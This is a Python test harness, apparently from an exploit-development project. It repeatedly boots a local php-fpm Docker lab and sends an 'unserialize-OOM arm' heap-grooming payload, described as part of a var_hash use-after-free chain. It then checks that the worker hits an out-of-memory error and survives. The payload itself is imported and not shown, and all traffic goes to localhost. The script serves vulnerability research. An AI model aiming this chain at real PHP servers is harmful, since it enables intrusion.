#!/usr/bin/env python3
"""Verify: the script-level unserialize-OOM arm SURVIVES on a fresh php-fpm worker
and leaves the worker serving (fresh-container-per-trial, black-box).

Lab (php:8.4.26-fpm behind nginx, single static worker, profile `a7r5` — reused
from the var_hash-UAF lab, which already matched this arm's pm=static/
max_children=1/128M shape; probe.php/arm.php/echo.php added to its webroot):
    docker compose -f docker-compose.fpm-avenues.yml --profile a7r5 up -d --build
    # nginx on 127.0.0.1:8167
Run:
    python3 -I poc/primitives/groom/verify_script_unserialize_oom_arm.py [ntrials]
The verifier drives the profile up/down itself (reliability claims on a persistent-
worker SAPI must be fresh-container-per-trial). PASS = every trial OOMed AND the
same worker PID served before and after. SKIP if docker/lab is unavailable.

Measured here on php:8.4.26-fpm: 20/20 SURVIVED, 20/20 OOMED.
"""
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.groom.script_unserialize_oom_arm import arm_parts  # noqa: E402
from common.multipart import multipart_default  # noqa: E402

REPO_ROOT = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO_ROOT, "docker-compose.fpm-avenues.yml")
BASE = "http://127.0.0.1:8167"
PROFILE = "a7r5"
FPM_CONTAINER = "p2s-a7r5-fpm"


def compose(*a, t=120):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO_ROOT, capture_output=True, text=True, timeout=t)


def get(path, data=None, ctype=None, t=90):
    req = urllib.request.Request(BASE + path, data=data)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def worker_pid():
    st, b = get("/probe.php", t=10)
    return b.split(b":", 1)[1].decode().strip() if (st == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(60):
        if worker_pid():
            return True
        time.sleep(0.5)
    return False


def oomed_in_log():
    # a7r5's lab sets display_errors=0 (deliberate, for its other chains'
    # error-leak hygiene), so the OOM fatal only shows in the fpm log, not
    # the HTTP response body.
    r = subprocess.run(["docker", "logs", "--tail", "5", FPM_CONTAINER],
                       capture_output=True, text=True, timeout=10)
    return "Allowed memory size" in (r.stdout + r.stderr)


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    body, headers = multipart_default(arm_parts())
    ct = headers["Content-Type"]
    survived = oomed = 0
    for i in range(1, n + 1):
        compose("down", t=60)
        if compose("up", "-d", "--build").returncode != 0 or not ready():
            print(f"trial {i}: SKIP (boot failed)"); compose("down", t=60); return
        p0 = worker_pid()
        st, resp = get("/arm.php", data=body, ctype=ct)
        is_oom = oomed_in_log()
        p1 = worker_pid()
        ok = (p1 is not None and p0 == p1)
        survived += ok; oomed += is_oom
        print(f"trial {i}: oom={is_oom} p0={p0} p1={p1} -> {'SURVIVED' if ok else 'LOST'}")
    compose("down", t=60)
    verdict = "PASS" if (survived == n and oomed == n) else "FAIL"
    print(f"\n{verdict}: survived={survived}/{n} oomed={oomed}/{n}")


if __name__ == "__main__":
    main()
